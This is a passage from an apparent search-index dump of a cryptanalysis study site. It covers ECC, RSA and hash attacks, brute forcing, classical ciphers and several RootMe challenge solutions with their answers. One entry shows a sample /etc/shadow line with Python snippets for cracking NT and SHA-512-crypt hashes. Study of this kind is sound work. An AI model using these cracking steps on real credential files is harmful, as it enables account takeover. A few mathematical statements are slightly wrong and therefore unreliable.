twisted Edwards curves). ECC encryption algorithms and hybrid encryption schemes like the ECIES integrated encryption scheme and EEECC (EC-based ElGamal). ECC key agreement algorithms like ECDH, X25519 and FHMQV. ECDH  ECDH is to the ECDLP problem what DH is to DLP: it’s secure as long as ECDLP is hard. DH protocols that rely on DLP can therefore be adapted to work with elliptic curves and rely on ECDLP as a hardness assumption. The output from ecc-based-key-derivation.py : Private key: 0x56654dafa1ac13a3d54cf6edeef33852a0a74418ca1a1d7180c25213976759fa Public key: 0x1d02eb6437a4e32037324bb2925c87bc84b2fd71a565268242ed8259515921fe0 Ciphertext public key: 0x9df7d5d762ee6a8018613eb3644ee7a21fd811cfa7f4167628a255c40db126ac0 Encryption key: 0x3c94844f84d94d280725701f7d18c2f6b463a04c0f7dfaf208d48e0fabd7122e1 Decryption key: 0x3c94844f84d94d280725701f7d18c2f6b463a04c0f7dfaf208d48e0fabd7122e1 ECDSA  The standard algorithm used for signing with ECC is ECDSA, which stands for elliptic curve digital signature algorithm. This algorithm has replaced RSA signatures and classical DSA signatures in many applications. It is, for example, the only signature algorithm used in Bitcoin and is supported by many TLS and SSH implementations. As with all signature schemes, ECDSA consists of a signature generation algorithm that the signer uses to create a signature using their private key and a verification algorithm that a verifier uses to check a signature’s correctness given the signer’s public key. The signer holds a number, \\(d\\) , as a private key, and verifiers hold the public key, \\(p = dG\\) . Both know in advance what elliptic curve to use, its order ( \\(n\\) , the number of points in the curve), and the coordinates of a base point, \\(G\\) . What can possibly go wrong?  Elliptic curves have their downsides due to their complexity and large attack surface. Their use of more parameters than classical Diffie–Hellman brings with it a greater attack surface with more opportunities for mistakes and abuse, and possible software bugs that might affect their implementation. Elliptic curve software may also be vulnerable to side-channel attacks due to the large numbers used in their arithmetic. If the speed of calculations depends on inputs, attackers may be able to obtain information about the formulas being used to encrypt. Breaking ECDH using another curve  ECDH can be elegantly broken if you fail to validate input points. The primary reason is that the formulas that give the coordinates for the sum of points \\(p + q\\) never involve the \\(b\\) coefficient of the curve; instead, they rely only on the coordinates of \\(p + q\\) and the \\(a\\) coefficient (when doubling a point). The unfortunate consequence of this is that when adding two points, you can never be sure that you’re working on the right curve because you may actually be adding points on a different curve with a different \\(b\\) coefficient. That means ECDH can be broken with the so-called invalid curve attack . ECDSA with bad randomness  ECDSA signing is randomized, as it involves a secret random number \\(k\\) when setting \\(s = (h + rd) / k \\mod n\\) . But if the same \\(k\\) is reused to sign a second message, an attacker could combine the resulting two values, \\(s_1 = (h_1 + rd) / k\\) and \\(s_2 = (h_2 + rd) / k\\) , to get \\(s_1 – s_2 = (h_1 – h_2) / k\\) and then \\(k = (h_1 – h_2) / (s_1 – s_2)\\) . When \\(k\\) is known, the private key \\(d\\) is easily recovered by computing \\((ks_1 − h_1)/r = ((h_1 + rd ) − h_1)/r = rd/r = d\\) . RootMe challenges  Discrete logarithm problem ECDHE ECDSA: Conventional attack ECDSA: Implementation error",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "16bb448e3c0ebe581b8b4c239eb86b94",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/bruteforce",
    "t": "Brute force ",
    "c": "Brute force  A brute force attack is a golden oldie, today still widely used and remains highly effective. Attackers use brute force attacks to: Crack passwords Decrypt encrypted data Gain access to unauthorised systems, websites or networks For example, public and private keys are used for encrypting and decrypting the data in a cryptographic system. In a brute force attack, possible private keys are used to decipher an encrypted message or data. The algorithm must be known, and is usually found as open-source programs. Types of attacks  In a simple brute force attack , an attacker tries to crack a small number of possible simple passwords or keys quickly. These attacks are only effective against systems with weak passwords or simple password policies. Simple passwords are guessed with common expressions like password and p4ssw0rd! . These attacks can be done manually or use automation and scripts. Automated attacks are also more likely to be detected and blocked by security systems. In a dictionary attack an attacker tries different possible passwords with a pre-arranged list of words, typically taken from a dictionary, against a username. A program is used to try different combinations of words and phrases. Used are unabridged or special dictionaries, augmented with numbers and special characters, and dictionaries of passwords that have been leaked by earlier data breaches. These attacks can be effective in contexts where people choose passwords that are simply words or phrases. Rainbow tables are the precomputed tables containing the hash values used to crack passwords. In a rainbow table attack an attacker tries to crack hashes of passwords that have been hashed using a variety of hashing algorithms, including MD5, SHA-1, and NTLM. Attackers can quickly look up the corresponding plaintext for a given hash without executing the computationally intensive process of hashing all possible plaintexts and comparing the result with the target hash. In brute force attacks the attackers do not know the password. In a reverse brute force attack the attacker knows the PIN or password, and tries to find the matching username. Usually, an attacker uses passwords leaked by earlier data breaches that can be found and/or bought online. In a hybrid brute force attack , an attacker combines a dictionary attack with a traditional brute force attack. The attacker will use a set of random characters and a program to try a list of common words and phrases. It allows the attacker to try both common and less common password options. In a credential stuffing attack an attacker uses a stolen (or bought) list of username and password pairs against various sites. These attacks can go undetected for a long time, as legitimate login credentials are used. In a password spraying attack one common password is applied to many accounts. These attacks are often successful as many people use the same password for multiple accounts. In a brute force attack on RDP connections an attacker tries to correctly guess the password to a remote desktop protocol (RDP) connection. If attackers can correctly guess the password, they can spread laterally throughout the network, injecting malware. Physical attack  Physical attacks can vary from blackmail to abduction. And are increasingly common, as James Lopps Known Physical Bitcoin Attacks repository attests to. Remediation  Use strong, unique passwords that are not based on words or phrases in a dictionary. Enable multifactor authentication (MFA). Keep track of login activities, like the number of failed login attempts and the failed IP addresses of users and locations. Limit the number of login attempts made within a certain period and lock down the account after a certain number of login attempts. Resources  danielmiessler/SecLists/passwords How to Calculate Password Entropy? Let’s settle the password vs. passphrase debate once and for all Check if your data has been leaked",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "64efff898faee0c301ba7f4fc183f891",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/rsa",
    "t": "RSA puzzling ",
    "c": "RSA puzzling  RSA encryption is an asymmetric algorithm that uses very large integers as both keys and messages, and the modular exponentiation as the primary mathematical operator for encryption and decryption. The algorithm is simple to understand and relatively easy to implement : Key generation Key distribution Encryption Decryption Message encryption is done with a Public Key , and message decryption is done with a Private Key – parameters ( \\(p\\) , \\(q\\) , \\(d\\) ) generated together with the Public Key . The private key is known only to the user, and the public key can be made known to anyone who wishes to send an encrypted message to the person with the corresponding private key. Key generation  To generate an RSA key pair : Pick two primes \\(p\\) and \\(q\\) Using \\(p\\) and \\(q\\) , calculate modulus \\(n = p × q\\) and its Euler’s totient \\(ϕ(n) = (p−1) × (q−1)\\) Choose the public exponent \\(e\\) with \\(gcd(e,ϕ(n)) = 1\\) sing the Extended Euclidean algorithm, compute the invert \\(d\\) of \\(e \\mod n\\) : \\(d ≡ e^{−1} \\mod (ϕ(n))\\) , which is the private exponent. Public key: \\(n, e\\) Private key: \\(n, d\\) Choose a message \\(m\\) to convert into integers Encrypt this plaintext \\(m\\) and receive a ciphertext \\(c ≡ m^e \\mod n\\) Decrypt a ciphertext \\(c\\) with \\(m ≡ c^d \\mod n\\) Trapdoor function  All public-key systems are based on the concept of trapdoor functions, simple to compute in one direction and computationally hard to reverse without knowledge of some special information called the trapdoor. In RSA, the trapdoor function is based on the hardness of factoring integers. Except in certain cases, there exists no efficient algorithm for factoring huge integers. The RSA trapdoor permutation is the core algorithm behind RSA-based encryption and signatures. Given a modulus \\(n\\) and number \\(e\\) , the public exponent, the RSA trapdoor permutation transforms a number \\(x\\) from the set \\(Z_n^*\\) into a number $y = x^e \\mod (n). When using the RSA trapdoor permutation to encrypt, the modulus \\(n\\) and the exponent \\(e\\) make up the RSA public key. In order to get \\(x\\) back from \\(y\\) , \\(d\\) is used: (1)  \\[\\begin{align} y^d \\mod n = (x^e)^d \\mod n = x^{ed} \\mod n = x \\end{align}\\] Because \\(d\\) is the trapdoor that allows decryption, it is part of the private key in the RSA key pair, and, unlike the public key, should always be kept secret. It is also called the secret exponent. \\(d\\) is not just any number; it is the number such that \\(e\\) multiplied by \\(d\\) is equivalent to 1, and therefore such that \\(x^{ed} \\mod n = x\\) for any \\(x\\) . We must have \\(ed = 1 \\mod φ(n)\\) in order to get \\(x^{ed} = x 1 = x\\) and to decrypt the message correctly. It is necessary to compute \\(modulo φ(n)\\) and not \\(modulo n\\) because exponents behave like the indexes of elements of \\(Z^n\\) rather than as the elements themselves. Because \\(Z^n\\) has \\(φ(n)\\) elements, the index must be less than \\(φ(n)\\) . Finding \\(φ(n)\\) for an RSA modulus n is equivalent to breaking RSA, because the secret exponent \\(d\\) can easily be derived from \\(φ(n)\\) and \\(e\\) , by computing \\(e\\) ’s inverse. Therefore, \\(p\\) and \\(q\\) must also be kept secret, since knowing \\(p\\) or \\(q\\) gives \\(φ(n)\\) by computing \\((p-1)(q-1) = φ(n)\\) . Elementary attacks  These include short message attacks in which an attacker knows some blocks of plaintext and tries to decode cipher text with the help of that; cycling attacks, in which the attacker thinks that the cipher text has been generated by using some permutation and uses all possible permutations of plain text to decipher the cipher text by ‘cycling’ the permutations; attacks in which an attacker uses the Extended Euclidean Algorithm to retrieve the plaintext based on ciphertext; and sometimes it happens that the plain text is the same as the cipher text after encryption. And if an attacker is able to know \\(p\\) and \\(q\\) using \\(n\\) , then it is possible to figure out the value of the private key. Common modulus  To avoid generating a different modulus \\(n\\) for each user, one may wish to fix \\(n\\) . The same \\(n\\) is used by all users. A trusted central authority could provide user \\(i\\) with a unique pair \\(e_i, d_i\\) from which user \\(i\\) forms a public key \\((n, e_i)\\) and a secret key \\((n, d_i)\\) . The resulting system is insecure. User Bob can use his own exponents \\(e_b, d_b\\) to factor the modulus \\(n\\) . Once \\(n\\) is factored Bob can recover Alice’s private key \\(d_a\\) from her public key \\(e_a\\) . Blinding  Let \\((n, d)\\) be Bob’s private key and \\((n, e)\\) his public key. Suppose Alice wants Bob’s signature on a message \\(m ∈ Z_n^∗\\) . Bob refuses to sign \\(m\\) . Marvin can try picking a random \\(r ∈ Z_n^∗\\) and sets \\(m' = r^e m \\mod n\\) and then asks Bob to sign the random message \\(m'\\) . Bob may be willing to provide his signature \\(s'\\) on the innocent-looking \\(m'\\) . Because \\(s' = (m')^d \\mod m\\) , Alice can now compute \\(s = s'/r \\mod n\\) and obtains Bob’s signature \\(s\\) on the original \\(m\\) . Low private exponent  If an attacker somehow guessed decryption key \\(d\\) , putting not only the ciphertext generated by encryption and the plaintext with corresponding encryption key in danger, also future messages are at risk. Wiener’s attack  Small value for \\(e\\) can lead to potential attacks known as attacks on the encryption key, such as Wiener’s attack on RSA with low private exponents. Wiener’s attack is an attack on RSA that uses continued fractions to find the private exponent \\(d\\) when it is small (less than \\(\\frac{1}{3} \\sqrt[4]{n}\\) ). We know that when picking the public exponent \\(e\\) to be a small number and calculating its inverse \\(d ≡ e^{−1} \\mod ϕ(n)\\) . Suppose we have the public key \\((n,e)\\) , this attack will determine \\(d\\) : Convert the fraction \\(\\frac{e}{n}\\) into a continued fraction \\([a_0;a_1,a_2,…,a_{k−2},a_{k−1},a_k]\\) . Iterate over each convergent in the continued fraction: (2)  \\[\\begin{align} \\frac{a_0}{1}, a_0 + \\frac{1}{a_1}, a_0 + \\frac{1}{a_1 + \\frac{1}{a_2}} ... , a_0 + \\frac{1}{a_1 + \\frac{1}{a_{k-2} + \\frac{1}{a_{k-1}}}} \\end{align}\\] Check if the convergent is \\(\\frac{k}{d}\\) by: Setting the numerator to be \\(k\\) and denominator to be \\(d\\) Check if \\(d\\) is odd, if not, move on to the next convergent Check if \\(ed ≡ 1 \\mod(k)\\) , if not, move on to the next convergent Set \\(ϕ(n) = \\frac{ed−1}{k}\\) and find the roots of the polynomial \\(x^2 − (n−ϕ(n)+1)x + n\\) If the roots of the polynomial are integers, then we’ve found \\(d\\) (If not, move on to the next convergent). If all convergents have been tried, and none of them work, then the given RSA parameters are not vulnerable to Wiener’s attack. Boneh-Durfee attack  The Boneh-Durfee attack is an extension of Wiener’s attack. That is, it also attacks on low private component \\(d\\) with a further relaxed condition. If \\(d\\) satisfies \\(d < n^{0.292}\\) , then it is possible to use the Boneh-Durfee attack to retrive \\(d\\) . Low public exponent  Coppersmith  The most powerful attacks on low public exponent RSA are based on the Coppersmith theorem . The theorem provides an algorithm for efficiently finding all roots of \\(f \\mod n\\) that are less than \\(x = n^{1/d}\\) . The algorithm’s running time decreases as \\(x\\) gets smaller. The strength of this theorem is its ability to find small roots of polynomials modulo a composite \\(n\\) . Application of Coppersmith’s Theorem: Attack stereotyped messages in RSA (sending messages whose difference is less than N1/e can compromise RSA) Security proof of RSA-OAEP (constructive security proof). Affine Padding Polynomially related RSA messages (sending the same message to multiple recipients) Factoring \\(n = pq\\) if the high bits of \\(p\\) are known. An algorithm that can get the private key for RSA in deterministic polynomial time can be used to factor \\(n\\) in deterministic polynomial time. Finding integers with a large smooth factor in a proscribed interval. Finding roots of modular...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "118d0922dc13e307d148111da29746b0",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/classical",
    "t": "Classical ciphers ",
    "c": "Classical ciphers  Classical ciphers are doomed to be insecure because they’re limited to operations you can do in our heads or on a piece of paper. They lack the computational power of a computer and are easily broken by simple computer programs. Caesar cipher  One of the most widely known historical encryption methods is the Caesar cipher. According to the Roman historian Gaius Suetonius Tranquillus (c. 70–130 CE), Julius Caesar used this cipher to encrypt military messages, shifting all letters of the plaintext three places to the right. Although the Caesar cipher is not useful for modern cryptographic needs, it does contain all the fundamental concepts needed for a cryptography algorithm A plaintext message An algorithm: shift every letter A key: for example +3 A ciphertext This is, essentially, the same structure used by all modern symmetric algorithms. Because there are only 26 letters in the English alphabet, the key space is 26 (in English). (1)  \\[\\begin{align} C\\equiv P \\oplus K\\mod(26) \\end{align}\\] The mathematical representation of Caesar’s method of shifting three to the right is: (2)  \\[\\begin{align} C\\equiv P \\oplus 3\\mod(26) \\end{align}\\] The Caesar cipher is super easy to break: to decrypt a given ciphertext, simply shift the letters three positions back to retrieve the plaintext. The Caesar cipher may have been strong enough during the time of Crassus and Cicero because no secret key was involved (it is always 3), and it was assumed attackers were illiterate or too uneducated to figure it out. This assumption no longer holds true. The Caesar cipher can be made more secure by using a variable secret shift value instead of always using 3, but that does not help much because an attacker could easily try all 25 possible shift values until the decrypted message makes sense. The Vigenère cipher   1500 years later, in 1553, a meaningful improvement of the Caesar cipher appeared in the form of the Vigenère cipher , created in the 16th century by Giovan Battista Bellaso. The name Vigenère comes from Blaise de Vigenère, who invented a different cipher in the 16th century, but due to historical misattribution, Vigenère’s name stuck. The Vigenère cipher is a method of encrypting alphabetic text by using a series of different mono-alphabet ciphers selected based on the letters of a keyword. Bellaso also added the concept of using any keyword, thereby making the choice of substitution alphabets difficult to calculate. The Vigenère cipher became favoured and was used during the American Civil War by Confederate forces and during WWI by the Swiss Army, among others. For many years, Vigenère was considered very strong, even unbreakable. In the nineteenth century, Friedrich Kasiski published a technique for breaking the Vigenère cipher. The math for Vigenère looks very similar to that of Caesar, with one important difference: the value \\(K\\) changes: (3)  \\[\\begin{align} C_i\\equiv P_i \\oplus K_i\\mod(26) \\end{align}\\] The \\(i\\) denotes the current key with the current letter of plaintext and the current letter of ciphertext. Many sources use \\(M\\) (for message) rather than \\(P\\) (for plaintext) in this notation. IOW, it is similar to the Caesar cipher, except that letters aren’t shifted by three places but rather by values defined by a key, a collection of letters that represent numbers based on their position in the alphabet. For example, if the key is DUH, letters in the plaintext are shifted using the values 3, 20, 7 because D is three letters after A, U is 20 letters after A, and H is seven letters after A. The 3, 20, 7 pattern repeats until the entire plaintext is encrypted. The Vigenère cipher is clearly more secure than the Caesar cipher, yet it’s still fairly easy to break : The first step to breaking it is to figure out the key’s length. If in the ciphertext a group of letters appears often, this gives clues about the key length. If for example a group of three letters (WBL) appears twice in a ciphertext at nine-letter intervals, this suggests that the same three-letter word was encrypted using the same shift values, producing WBL each time. A cryptanalyst can then deduce that the key’s length is either nine or a value divisible by nine (that is, three). The second step to breaking the Vigenère cipher is to determine the actual key using a method called frequency analysis, which exploits the uneven distribution of letters in languages. For example, in English, E is the most common letter, so if you find that X is the most common letter in a ciphertext, then the most likely plaintext value at this position is E. Breaking ciphers  Trying to figure out the workings of a cipher, first identify its two main components: its permutation and a mode of operation. A permutation is a function that transforms an item (a letter or a group of bits) such that each item has a unique inverse. Most classical ciphers work by replacing each letter with another letter. In the Caesar and Vigenère ciphers, the substitution is a shift in the alphabet. The alphabet or set of symbols can vary: it could be the Arabic alphabet; instead of letters, it could be words, numbers, or ideograms, etc. To be secure, a cipher’s permutation should satisfy three criteria: The permutation should be determined by the key, to keep the permutation secret as long as the key is secret. In the Vigenère cipher, if you don’t know the key, you don’t know which of the 26 permutations was used; that makes it harder to decrypt. Different keys should result in different permutations. If not, it becomes easier to decrypt without the key: if different keys result in the same permutations, there are fewer distinct keys than distinct permutations, and therefore fewer possibilities to try when decrypting without the key. The permutation should look random: patterns make a permutation predictable for an attacker, and therefore less secure. A mode of operation is an algorithm that uses a permutation to process messages of arbitrary size. It mitigates the exposure of duplicate letters in the plaintext by using different permutations for duplicate letters. The mode of the Caesar cipher repeats the same permutation for each letter, and in the Vigenère cipher letters at different positions undergo different permutations: if the key is N letters long, then N different permutations will be used for every N consecutive letters. This can still result in patterns in the ciphertext because every Nth letter of the message uses the same permutation. That’s why frequency analysis works to break the Vigenère cipher. Frequency analysis can be defeated if the Vigenère cipher only encrypts plaintexts that are of the same length as the key. In which case, another problem appears: reusing the same key several times exposes similarities between plaintexts. For example, with the key KYN, the words TIE and PIE encrypt to DGR and ZGR, respectively. Both end with the same two letters (GR), revealing that both plaintexts share their last two letters as well. Finding these patterns shouldn’t be possible with a secure cipher. To build a secure cipher, combine a secure permutation with a secure mode. Ideally, this combination prevents attackers from learning anything about a message other than its length. One-Time Pad  A classical cipher can not be secure unless it comes with a huge key, and encrypting with a huge key is impractical. The one-time pad is such a cipher, and it is the most secure cipher. The one-time pad takes a plaintext, \\(P\\) , and a random key, \\(K\\) , that is the same length as \\(P\\) and produces a ciphertext \\(C\\) , defined as (4)  \\[\\begin{align} C\\equiv P \\oplus K \\end{align}\\] where \\(C\\) , \\(P\\) , and \\(K\\) are bit strings of the same length and where ⊕ is the bitwise exclusive OR operation ( XOR ), defined as \\(0 ⊕ 0 = 0\\) , \\(0 ⊕ 1 = 1\\) , \\(1 ⊕ 0 = 1\\) , and \\(1 ⊕ 1 = 0\\) . The concept behind a one-time pad is that the plaintext is somehow altered by a random string of data so that the...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2041abdf11eafb430150c2acd490942a",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/hashes/sha2",
    "t": "SHA-2 Hash ",
    "c": "SHA-2 Hash  This hash was stolen during a session interception on a critical application, errors may have occurred during transmission. No crack attempt has resulted so far; hash format seems unknown. Find the corresponding plaintext. The answer is the SHA-1 of this password. 96719db60d8e3f498c98d94155e1296aac105ck4923290c89eeeb3ba26d3eef92 Crackstation decrypts it as sha256 to 4dM1n Making the SHA-1 : echo -n 4dM1n | sha1sum | awk '{print $1}'",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "08b4f85380e84bfbc291d8a21be707a4",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/lee-cooper",
    "t": "RSA Lee cooper ",
    "c": "RSA Lee cooper  RootMe Challenge: The shortest path : During a digital investigation, I managed to extract a lot of files including one that seemed rather interesting. Lacking time, I did not attempt to review its contents in depth but I’m quite sure it contains vital information. I’m counting on you to extract it!",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c3880e16a3e035ff19cbf273bc1c4053",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ciphers/vigenere",
    "t": "Poly-alphabetic substitution: Vigenère ",
    "c": "Poly-alphabetic substitution: Vigenère  RootMe Challenge: Polyalphabetic substitution: Vigenère : We need your expert opinion on this document. This is an old letter, and it appears that it is important for the pirates that we are searching for. Your mission is to decipher the text and give us the full name of the author (example : “John Doe”). Solution  I used Vigenere Hack which tells me the Key/Password is most likely THEMENTOR . Using that I got a halfway readable text. Obviously the latter part has another Key/Password . Not needed, I recognise the text. The Conscience of a Hacker (also known as The Hacker Manifesto ) is a small essay written January 8, 1986, by a computer security hacker who went by the handle (or pseudonym) of The Mentor , who belonged to the second generation of hacker group Legion of Doom. The Manifesto was written after the author’s arrest, and first published in the underground hacker ezine Phrack .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "7884d1dc389f7a6fb76227e1286b8f3e",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/hashes",
    "t": "Hacking hashes ",
    "c": "Hacking hashes  Hash functions, like MD5, SHA-1, SHA-256, SHA-3, and BLAKE2, are used in digital signatures, public-key encryption, integrity verification, message authentication, password protection, key agreement protocols, and many other cryptographic protocols. Security goals  Hash functions in applied cryptography are constructions that were originally defined to provide three specific security properties: Pre-image resistance ensures that no one should be able to reverse the hash function in order to recover the input given an output. Second pre-image resistance: if I give you an input and the digest it hashes to, you should not be able to find a different input that hashes to the same digest. Collision resistance: one should be able to produce two different inputs that hash to the same output. This definition has changed over time, and are often meaningless on their own; it all depends on how the hash function is used. In addition, hash functions are usually designed so that their digests are unpredictable and random. This is useful because one cannot always prove a protocol to be secure. Many protocols are instead proven in the random oracle model, where a fictional and ideal participant called a random oracle is used. In this type of protocol, one can send any inputs as requests to that random oracle, which is said to return completely random outputs in response, and like a hash function, giving it the same input twice returns the same output twice. Proofs in this model are sometimes controversial as we do not know for sure if we can replace these random oracles with real hash functions (in practice). Yet, many legitimate protocols are proven secure using this method, where hash functions are seen as more ideal than they probably are. Finding collisions  Naive birthday attack  Compute \\(2^{n/2}\\) hashes of \\(2^{n/2}\\) arbitrarily chosen messages and store all the message/hash pairs in a list. Sort the list with respect to the hash value to move any identical hash values next to each other. Search the sorted list to find two consecutive entries with the same hash value. This method requires a lot of memory (storing \\(2^{n/2}\\) message/hash pairs), and sorting lots of elements slows down the search, requiring about \\(2^{2n}\\) basic operations on average using even the quicksort algorithm. The Rho method  The Rho method is an algorithm for finding collisions that, unlike the naive birthday attack, requires only a small amount of memory: Given a hash function with \\(n\\) -bit hash values, pick some random hash value ( \\(H_1\\) ), and define \\(H_1 = H'_1\\) . Compute \\(H_2 = Hash(H_1)\\) , and \\(H'_2 = Hash(Hash(H'_1))\\) ; that is, in the first case apply the hash function once, and in the second case twice. Iterate the process and compute \\(H_i + 1 = Hash(H_i)\\) , \\(H'_i + 1 = Hash(Hash(H'_i))\\) , until you reach \\(i\\) such that \\(H_i + 1 = H'_i + 1\\) . Advanced collision-finding techniques work by first detecting the start of the cycle and then finding the collision, without storing numerous values in memory and without needing to sort a long list. Cracking hashes  Having the hash value of something, and wanting to calculate the data it came from, in general, there is no unique solution. For short objects like passwords, there is. If someone uses an MD5 function to obscure a password (done by some old web applications still existing in the wild), then you can reverse it by guessing passwords until finding a match. There is no mathematical way to undo a hash function, so the best way is to make (or use) a library. Windows passwords  The hash used by, for example, Windows Server is the NT Hash. If two users have the same password, they have exactly the same hash. The algorithm Microsoft uses takes the password and encodes in Unicode instead of ASCII, to allow for passwords in languages such as Chinese and Japanese that do not encode with 8-bits per character but 16-bits per character. Then it is run through MD4 (an algorithm even older than MD5) to produce the NT hash value. Because password hashes have no variation and any two users with the same password will have the same hash, all the hackers that had cracked wordlists for the last decades have put their results on the internet. For example, you can use the crackstation or hashes.com . This availability has even resulted in a situation where you can just Google frequently used password hashes. When the passwords cannot be cracked, you can try guessing using hashlib . Make series of guesses (or use a passwordlist), hash them, and hunt for the answer. import hashlib hashlib.new(\"md4\", \"password\".encode(\"utf-16le\")).hexdigest() Linux password hashes  In Linux, the hashes can be found in the /etc/shadow file. username:$6$ligE06T/QLQMANm9$8GDajwZJahwNnnW/OtfwLUGZHYcmTd9RByNz2e32iJAx37fSu7R1mpxTwWOqwlc4etyR/SLBkfiksitUHXRVV.:18961:0:99999:7::: After each username comes $6 , which indicates it is a type 6 password, then there is a random string of characters that goes up to the next dollar sign, the salt, and then an even longer random string of characters, which is the actual password hash itself. When users have the same password, they have completely different hashes, because a random salt is added before hashing them, to obscure the fact that these passwords are the same. Besides salting, stretching is also used. Calculating the hash uses 5,000 rounds of SHA-512, which takes much more CPU time. This might slow down attackers trying to make dictionaries of password hashes. Make series of guesses (or use a wordlist for a dictionary attack), hash them, and hunt for an answer. from passlib.hash import sha512_crypt sha512_crypt.using(salt=\"ligE06T/QLQMANm9\", rounds=5000).hash(\"password\") This will be very, very, time-consuming. You can also use Hascat or [John the Ripper](red-testlab:docs/crypto/john https://testlab.tymyrddin.dev/docs/crypto/john) RootMe challenges  DCC Hash DCC2 Hash LM Hash Message Digest 5 NT Hash SHA-2 Hash CISCO Salted password SHA-3 Hash Security  Despite their apparent simplicity, hash functions can cause major security troubles when used at the wrong place or in the wrong way—for example, when weak checksum algorithms like CRCs are used instead of a crypto hash to check file integrity in applications transmitting data over a network. However, this weakness pales in comparison to some others, which can cause total compromise in seemingly secure hash functions. Resources  Collisions of MD5 rfc1321",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2b722edd3cb531a02b1e16eb95e1d35f",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/aes/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Symmetric encryption is at the foundation of all modern secure communications. It is what is used to “scramble” messages so that people can only decrypt them if they have access to the same key used to encrypt them. AES is a pretty good place to start. Why?  AES is used in many common Internet protocols and operating system services, including TLS (used by HTTPS), IPSec, and file-level or full-disk encryption. Given its ubiquity, it is one of the most important ciphers to know how to use properly and the principles of correct use of AES transfer easily to correct use of other ciphers. How?  CBC Bit-flipping attack AES Electronic code book Initialisation vector AES 4 rounds AES128 Counter mode attack AES Fault attack #1 CBC padding attack Side channel AES: CPA Side Channel AES: first round AES Weaker variant AES Fault attack #2 AES PMAC forgery attack",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5fb12bb6dab2de299f8f6917caf06103",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ciphers/rail-fence",
    "t": "Transposition: Rail Fence ",
    "c": "Transposition: Rail Fence  Transposition  Transposition ciphers provide yet another avenue for encryption. There are many types of transposition ciphers, including the rail fence cipher, route cipher, Myszkowski transposition cipher, disrupted transposition cipher, and columnar transposition cipher. Because transposition ciphers do not affect the letter frequencies, they can be detected through frequency analysis. Columnar  H A C K 3 1 2 4 T h i s - i s - a - s e c r e t - t e x t - - - Rail fence cipher  The rail fence cipher may be the most widely known transposition cipher. You encrypt the message by alternating each letter on a different row. Attack at dawn is written like this: A t c a d w t a k t a n RootMe challenge  RootMe Challenge: Transposition - Rail Fence : USA, American Civil War, August 3, 1862. You are on patrol around the camp when you see an enemy rider. Once you intercepted him, you discover that he carries a message but nobody at the camp manages to decipher it. You are the only hope to find the hidden information. It could be crucial! Solution  Using Rail Fence : Will·invade·Kentucky·on·October·the·eighth.·signal·is·\"Frozen·chicken\"",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a86885a5656c0b9baa3949e90b343d31",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/dh",
    "t": "Diffie-Hellman ",
    "c": "Diffie-Hellman  Prior to Diffie–Hellman, establishing a shared secret required performing tedious procedures such as manually exchanging sealed envelopes. Once communicating parties have established a shared secret value with the DH protocol, that secret can be used to establish a secure channel by turning the secret into one or more symmetric keys that are then used to encrypt and authenticate subsequent communication. The DH protocol (and its variants) are therefore called key agreement protocols. Choose a prime \\(p\\) and a generator \\(g ∈ \\mathbb{F}_p\\) Alice picks a private key \\(a ∈ \\mathbb{Z}_{p−1}\\) Bob picks a private key \\(b ∈ \\mathbb{Z}_{p−1}\\) Alice’s public key is \\(g^a \\mod p\\) Bob’s public key is \\(g^a \\mod p\\) Their shared key is \\(g^{ab} ≡ (g^a)^b ≡ (g^b)^a \\mod p\\) Diffie–Hellman’s simplicity can be deceiving. For one thing, it won’t work with just any prime \\(p\\) or base number \\(g\\) . For example, some values of \\(g\\) will restrict the shared secrets \\(g^{ab}\\) to a small subset of possible values, whereas you’d expect to have about as many possible values as elements in \\(\\mathbb{Z}_p^*\\) , and therefore as many possible values for the shared secret. To ensure the highest security, safe DH parameters should work with a prime \\(p\\) such that \\((p – 1) / 2\\) is also prime. Such a safe prime guarantees that the group does not have small subgroups that would make DH easier to break. The dhparam command of the OpenSSL toolkit will only generate safe DH parameters, but the extra checks built into the algorithm result increase the execution time considerably. What can possibly go wrong?  Diffie–Hellman protocols can fail spectacularly in a variety of ways. Not hashing the shared secret Using legacy Diffie–Hellman: The TLS protocol is the security behind HTTPS secure websites as well as the secure mail transfer protocol (SMTP). TLS takes several parameters, including the type of Diffie–Hellman protocol it will use, though most TLS implementations still support anonymous DH for legacy reasons, despite its insecurity. Unsafe group parameters: In January 2016, the maintainers of the OpenSSL toolkit fixed a high-severity vulnerability ( CVE-2016-0701 ) that allowed an attacker to exploit unsafe Diffie–Hellman parameters. The root cause of the vulnerability was that OpenSSL allowed users to work with unsafe DH group parameters (namely, an unsafe prime p) instead of throwing an error and aborting the protocol altogether before performing any arithmetic operation.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a254328958e14d8e260c714ece4b75ee",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/models",
    "t": "Attack models ",
